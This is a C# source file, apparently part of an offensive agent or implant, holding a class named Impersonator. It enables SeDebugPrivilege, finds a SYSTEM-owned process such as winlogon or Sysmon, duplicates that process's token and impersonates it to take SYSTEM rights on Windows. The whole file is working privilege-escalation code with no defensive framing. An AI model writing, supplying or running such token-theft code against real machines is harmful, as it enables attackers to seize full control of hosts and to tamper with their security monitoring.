﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Agent.Internal
{
    public static class Impersonator
    {

        public static bool ElevateToSystem()
        {
            EnablePrivilege("SeDebugPrivilege");
            if (!IsPrivilegeEnabled("SeDebugPrivilege"))
            {
                return false;
            }
            Process[] proccesses = Process.GetProcesses();
            int lsassPid = 0;
            foreach (Process proc in proccesses)
            {
                if (proc.ProcessName == "Sysmon" || proc.ProcessName == "OfficeClickToRun" || proc.ProcessName == "winlogon")
                {
                    Console.WriteLine(proc.ProcessName);
                    lsassPid = proc.Id;
                    break;
                }
            }
            if (lsassPid == 0)
            {
                return false;
            }
            if (!ImpersonateLoggedOnUserViaToken(lsassPid))
            {
                return false;
            }
            return true;
        }

        private static bool ImpersonateLoggedOnUserViaToken(int pid)
        {
            var allAccessFlags = Native.Kernel32.ProcessAccessFlags.All;
            IntPtr hProcess = Native.Kernel32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            IntPtr hToken;
            if (!Native.Advapi.OpenProcessToken(hProcess, Native.Advapi.TOKEN_IMPERSONATE | Native.Advapi.TOKEN_DUPLICATE, out hToken))
            {
                return false;
            }
            IntPtr DuplicatedToken = new IntPtr();
            if (!Native.Advapi.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            // impersonate logged on user with duplicated token
            if (!Native.Advapi.ImpersonateLoggedOnUser(DuplicatedToken))
            {
                return false;
            }
            return true;
        }
        public static bool IsPrivilegeEnabled(string Privilege)
        {
            bool ret;
            Native.Advapi.LUID luid = new Native.Advapi.LUID();
            IntPtr hProcess = Native.Kernel32.GetCurrentProcess();
            IntPtr hToken;
            if (hProcess == IntPtr.Zero) return false;
            if (!Native.Advapi.OpenProcessToken(hProcess, Native.Advapi.TOKEN_QUERY, out hToken)) return false;
            if (!Native.Advapi.LookupPrivilegeValue(null, Privilege, out luid)) return false;
            Native.Advapi.PRIVILEGE_SET privs = new Native.Advapi.PRIVILEGE_SET { Privilege = new Native.Advapi.LUID_AND_ATTRIBUTES[1], Control = Native.Advapi.PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
            privs.Privilege[0].Luid = luid;
            privs.Privilege[0].Attributes = Native.Advapi.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
            if (!Native.Advapi.PrivilegeCheck(hToken, ref privs, out ret)) return false;
            return ret;
        }

        public static bool EnablePrivilege(string Privilege)
        {
            Native.Advapi.LUID luid = new Native.Advapi.LUID();
            IntPtr hProcess = Native.Kernel32.GetCurrentProcess();
            IntPtr hToken;
            if (!Native.Advapi.OpenProcessToken(hProcess, Native.Advapi.TOKEN_QUERY | Native.Advapi.TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
            if (!Native.Advapi.LookupPrivilegeValue(null, Privilege, out luid)) return false;
            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.
            Native.Advapi.LUID_AND_ATTRIBUTES luAttr = new Native.Advapi.LUID_AND_ATTRIBUTES { Luid = luid, Attributes = Native.Advapi.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };
            // Now we create a TOKEN_PRIVILEGES structure with our modifications
            Native.Advapi.TOKEN_PRIVILEGES tp = new Native.Advapi.TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new Native.Advapi.LUID_AND_ATTRIBUTES[1] };
            tp.Privileges[0] = luAttr;
            Native.Advapi.TOKEN_PRIVILEGES oldState = new Native.Advapi.TOKEN_PRIVILEGES(); // Our old state.
            if (!Native.Advapi.AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;
            return true;
        }
    }
}
